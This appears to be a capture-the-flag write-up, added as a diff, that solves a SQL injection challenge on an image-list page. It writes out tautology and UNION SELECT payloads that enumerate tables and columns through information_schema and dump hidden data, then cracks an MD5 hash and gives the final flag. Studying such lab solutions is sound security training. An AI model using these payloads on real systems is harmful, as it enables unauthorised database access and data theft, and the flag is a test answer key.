@@ -1,0 +1,17 @@
+1 OR 1 = 1 
+For a fast check of image list.
+
+1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- -
+list_images
+Juste for know the name of table.
+
+1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database() -- -
+id,url,title,comment
+Now we know all colomns name let's check it.
+
+1 UNION SELECT title,comment FROM list_images-- 
+
+And we have: Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+1928e8083cf461a51303633093573c46 -> md5 -> albatroz
+albatroz -> sha256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
